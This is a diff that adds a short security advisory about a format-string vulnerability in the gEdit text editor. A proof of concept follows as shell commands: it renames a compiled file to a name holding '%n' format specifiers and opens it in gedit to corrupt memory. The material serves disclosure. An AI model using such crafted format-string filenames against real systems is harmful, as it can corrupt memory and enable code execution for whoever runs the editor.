@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/13699/info
+
+gEdit is prone to a format-string vulnerability. Exploitation may occur when the program is invoked with a filename that includes malicious format specifiers.
+
+Attackers could exploit this issue to corrupt arbitrary regions of memory with attacker-supplied data, potentially resulting in the execution of arbitrary code in the context of the user running the program. 
+
+bash-2.05b#cat fmtexp.c
+
+#include <stdio.h>
+
+
+int
+main()
+{
+printf("hah gedit\n");
+}
+
+
+bash-2.05b#gcc -o fk fmtexp.c
+
+bash-2.05b#mv fk AA%n%n%n.c
+
+bash-2.05b#gedit AA%n%n%n.c 
